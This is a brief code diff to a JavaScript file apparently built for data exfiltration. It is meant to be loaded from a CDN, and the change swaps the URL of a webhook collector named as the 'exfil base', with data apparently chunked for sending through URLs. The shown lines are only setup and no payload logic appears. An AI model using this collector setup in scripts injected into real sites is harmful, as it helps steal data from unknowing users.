@@ -1,6 +1,6 @@
 // ppp.js — hosted on GitHub; will be loaded via jsDelivr CDN
 // Exfil base (Beeceptor / webhook.site)
-const EXFIL_BASE = "https://pepechicken.free.beeceptor.com"; // <-- yours
+const EXFIL_BASE = "https://lululele.free.beeceptor.com"; // <-- yours
 const CHUNK = 900; // safe URL length for most collectors
 
 (function(){
